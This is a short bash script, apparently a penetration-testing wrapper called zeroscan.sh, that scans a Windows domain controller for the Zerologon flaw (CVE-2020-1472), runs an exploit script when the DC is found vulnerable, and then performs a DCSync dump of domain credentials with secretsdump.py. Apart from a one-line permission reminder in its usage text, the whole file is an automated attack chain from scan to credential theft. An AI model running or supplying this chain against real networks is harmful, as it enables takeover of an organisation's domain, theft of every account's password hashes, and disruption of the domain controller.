#!/bin/bash

# Function to display usage
usage() {
    printf "\nSyntax: zeroscan.sh <DC NetBIOS name> <DC IP address>\n"
    printf "Example: ./zeroscan.sh DC01 192.168.123.1\n"
    printf "Runs zerologon check and exploits if vulnerable. Ensure to have permission to test the target.\n"
}

# Check for root privileges
if [ "$(id -u)" -ne 0 ]; then
    printf "Please run as root\n"
    exit 1
fi

# Check if the required number of arguments was provided
if [ $# -ne 2 ]; then
    printf "No arguments supplied or insufficient arguments provided\n"
    usage
    exit 1
fi

NETBIOS_NAME="$1"
DC_IP="$2"
OUTPUT_FILE="exploit_${DC_IP}.txt"

# Paths to scripts
ZEROLOGON_SCRIPT="./zerologon/zerologon.py"
EXPLOIT_SCRIPT="./CVE-2020-1472/cve-2020-1472-exploit.py"

# Redirect stdout and stderr to the output file
exec > >(tee "$OUTPUT_FILE") 2>&1

# Check for required scripts
if [ ! -f "$ZEROLOGON_SCRIPT" ]; then
    printf "Error: zerologon.py script not found in the expected directory.\n"
    exit 1
fi

if [ ! -f "$EXPLOIT_SCRIPT" ]; then
    printf "Error: cve-2020-1472-exploit.py script not found in the expected directory.\n"
    exit 1
fi

# Scans the target for the vulnerability
printf "Scanning the target for the Zerologon vulnerability\n"
SCAN_RESULT=$(python3 "$ZEROLOGON_SCRIPT" "$NETBIOS_NAME" "$DC_IP")

echo "$SCAN_RESULT"

# Check for successful zerologon scan and if exploit is complete
if [[ "$SCAN_RESULT" == *"Success! DC can be fully compromised by a Zerologon attack."* ]]; then
    printf "Vulnerability detected. Running CVE-2020-1472 exploit script...\n"
    EXPLOIT_RESULT=$(python3 "$EXPLOIT_SCRIPT" "$NETBIOS_NAME" "$DC_IP")
    echo "$EXPLOIT_RESULT"
    if [[ "$EXPLOIT_RESULT" == *"Exploit complete!"* ]]; then
        printf "Exploit completed successfully. Performing DCSync attack...\n"
        secretsdump.py -just-dc "$NETBIOS_NAME"\$@"$DC_IP" -no-pass
    fi
else
    printf "Target is not vulnerable or script failed to verify vulnerability.\n"
fi

printf "Scan completed.\n"
